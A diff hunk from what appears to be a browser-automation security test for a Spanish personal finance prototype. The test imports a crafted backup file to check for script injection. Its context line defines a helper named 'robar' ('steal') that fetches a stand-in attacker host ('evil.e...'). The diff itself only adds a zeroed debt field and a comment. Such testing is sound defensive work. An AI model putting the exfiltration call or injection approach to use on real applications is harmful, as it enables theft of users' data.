@@ -21,7 +21,7 @@ const robar=p=>p.evaluate(async()=>{const out={};try{await fetch('https://evil.e
   await p.addInitScript(()=>{window.__hits=0;window.__x=()=>{window.__hits++;};try{localStorage.setItem('mis-finanzas-prototipo-v1-instalar','1');}catch(e){}});
   await p.route('**/*',r=>{const u=r.request().url();if(u.startsWith('http://127.0.0.1:8765'))return r.continue();if(u.includes('hart'))return r.fulfill({contentType:'application/javascript',headers:{'access-control-allow-origin':'*'},body:chart});return r.abort();});
   await p.goto('http://127.0.0.1:8765/wrap-repo.html#ajustes');await p.waitForSelector('#app');await p.waitForTimeout(500);
-  const S=JSON.parse(JSON.stringify(demo.S)),m=S['2026'][10];m.bbva=[{c:X,m:50,f:'3-nov',k:X,cur:X}];
+  const S=JSON.parse(JSON.stringify(demo.S)),m=S['2026'][10];m.bbva=[{c:X,m:50,f:'3-nov',k:X,cur:X}];m.copen={bbva:0};/* sin deuda heredada: la cifra debe ser solo los 50 */
   const cid={};['bbva','bcp','oh','ing','fij','hor'].forEach(k=>{cid[k]={cur:X,w:X,ty:X};});
   const j={S,cfg:Object.assign({},demo.cfg,{bancos:{bbva:X,bcp:X,oh:X},onb:1}),LAY:{mes:{order:[X],c:Object.assign(cid,{[X]:{cur:X}})},resumen:{order:[X],c:{}}}};
   await p.setInputFiles('#bk-file',{name:'plantilla.json',mimeType:'application/json',buffer:Buffer.from(JSON.stringify(j))});await p.waitForTimeout(800);
